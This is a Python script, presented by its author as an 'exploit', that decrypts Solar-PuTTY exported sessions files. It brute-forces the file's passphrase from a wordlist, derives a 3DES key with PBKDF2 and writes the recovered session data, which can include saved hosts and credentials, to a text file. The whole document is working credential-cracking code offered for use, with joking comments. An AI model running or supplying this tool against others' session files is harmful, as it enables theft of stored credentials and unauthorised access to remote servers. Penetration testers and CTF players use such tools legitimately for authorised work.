#Written by Watchmakerr

#Unless you don't like it

#Inspired by VoidSec

#But written in python because who wants an entire visual studio project for an exploit that takes 115 lines of bloated python code

#Microsoft? More like garbage

#Haha..

#(Cries in unemployed)

import os
import base64
import hashlib
import json
import sys

from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad
from Crypto.Cipher.DES3 import adjust_key_parity

def Decrypt(passPhrase, cipherText):
    try:
        data = base64.b64decode(cipherText)
        salt = data[:24]
        rgbIV = data[24:48]
        encrypted_data = data[48:]
        key = hashlib.pbkdf2_hmac('sha1', passPhrase.encode('utf-8'), salt, 1000, dklen=24)
        # Adjust the key parity bits for DES3
        key = adjust_key_parity(key)
        # Use only the first 8 bytes of the IV
        iv = rgbIV[:8]
        # Create DES3 cipher
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        # Decrypt and unpad the data
        decrypted_data = cipher.decrypt(encrypted_data)
        decrypted_data = unpad(decrypted_data, DES3.block_size)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"Error in Decrypt with password '{passPhrase}': {e}")
        return None

def main():
    print("   ____       __             ___         __   __          _____                 __            ")
    print("  / __/___   / /___ _ ____  / _ \\ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____")
    print(" _\\ \\ / _ \\ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  '_// -_)/ __/")
    print("/___/ \\___//_/ \\_,_//_/   /_/    \\_,_/ \\__/ \\__/ \\_, /  \\___//_/   \\_,_/ \\__//_/\\_\\ \\__//_/   ")
    print("                                                /___/                                         ")


    # Parse command line arguments
    import argparse
    parser = argparse.ArgumentParser(description="Decrypt SolarPutty sessions file.")
    parser.add_argument('sessions_file',
                        help='Path to the SolarPutty sessions file')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-p', '--password', help='Password to use for decryption')
    group.add_argument('-w', '--wordlist', help='Path to the password wordlist file')
    args = parser.parse_args()

    sessions_file = args.sessions_file

    if not os.path.exists(sessions_file):
        print(f"Sessions file not found: {sessions_file}")
        sys.exit(1)

    # Read the sessions file
    with open(sessions_file, 'r') as f:
        cipherText = f.read().strip()

    # If a single password is provided
    if args.password:
        password = args.password.strip()
        print(f"Trying to decrypt using password: {password}")
        decrypted_data = Decrypt(password, cipherText)
        if decrypted_data:
            try:
                obj = json.loads(decrypted_data)
                # Decryption successful
                print(f"Decryption successful using password: {password}")
                with open('SolarPutty_sessions_decrypted.txt', 'w') as outputFile:
                    json.dump(obj, outputFile, indent=4)
                print("[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt")
                sys.exit(0)
            except json.JSONDecodeError:
                print("Failed to parse decrypted data as JSON.")
        else:
            print("Decryption failed with the provided password.")
        sys.exit(1)

    # If a wordlist is provided
    if args.wordlist:
        password_file = args.wordlist

        if not os.path.exists(password_file):
            print(f"Password file not found: {password_file}")
            sys.exit(1)

        # Read passwords from wordlist
        try:
            with open(password_file, 'r', encoding='latin-1') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError as e:
            print(f"Error reading wordlist file: {e}")
            sys.exit(1)

        print("Trying to decrypt using passwords from wordlist...")
        for password in passwords:
            decrypted_data = Decrypt(password, cipherText)
            if decrypted_data:
                try:
                    obj = json.loads(decrypted_data)
                    # Decryption successful
                    print(f"Decryption successful using password: {password}")
                    with open('SolarPutty_sessions_decrypted.txt', 'w') as outputFile: #For those of you following along at home, this is where you can get super creative with your output file name. This one came to me in a dream, but you're always welcome to change it. Go nuts.
                        json.dump(obj, outputFile, indent=4)
                    print("[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt") # oh and here too I guess
                    sys.exit(0)
                except json.JSONDecodeError:
                    # Decryption failed, continue to next password
                    pass

        print("Failed to decrypt sessions file with provided passwords.")
        sys.exit(1)

if __name__ == '__main__':
    main()
